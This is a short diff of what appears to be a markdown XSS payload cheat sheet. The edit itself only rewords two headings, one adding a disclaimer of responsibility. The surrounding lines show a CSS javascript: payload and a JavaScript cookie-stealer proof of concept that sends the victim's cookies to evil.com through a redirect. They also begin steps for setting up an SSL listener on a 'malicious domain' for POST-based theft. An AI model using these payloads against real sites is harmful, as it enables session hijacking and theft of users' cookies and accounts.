@@ -47,7 +47,7 @@ body { background-image: url('javascript:alert("XSS")'); }
 
 ### Cookie Stealer Example:
 
-`GET` based interception
+- `GET` based interception (easiest and best to show Poc):
 
 ```js
 // XSS cookie stealer POC
@@ -56,7 +56,7 @@ var url = 'https://evil.com/index.html/?victim_cookie=' + cookie;
 window.location.href = url;
 ```
 
-`POST` based interception:
+- `POST` based interception (I am not responsible for what you do with this info):
 
 1. Get ssl certitficates for your malicious domain: `sudo certbot certonly --standalone -d domain.tld`
 2. Setup the listener with ssl certificates
